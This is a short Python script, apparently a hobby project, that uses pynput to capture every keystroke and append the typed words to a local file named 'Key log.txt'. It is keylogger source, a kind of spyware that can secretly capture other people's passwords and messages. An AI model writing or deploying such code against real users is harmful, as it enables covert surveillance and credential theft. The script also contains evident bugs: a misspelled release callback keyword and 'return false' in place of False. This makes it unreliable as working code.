#pip install pynput
from pynput.keyboard import Key, Listener

filename = "Key log.txt"

word = []

def on_press(key):
    if key != Key.space:
        word.append(key)

    else:
        print(word)
        with open(filename, "a") as f:
            for letter in word:
                letter = str(letter).strip("'")
                f.write(str(letter))
            f.write(" ")
        word.clear()

def on_relese(key):
    if key == Key.esc:
        return false

with Listener(on_press=on_press, on_relese=on_relese) as listener:
    listener.join()

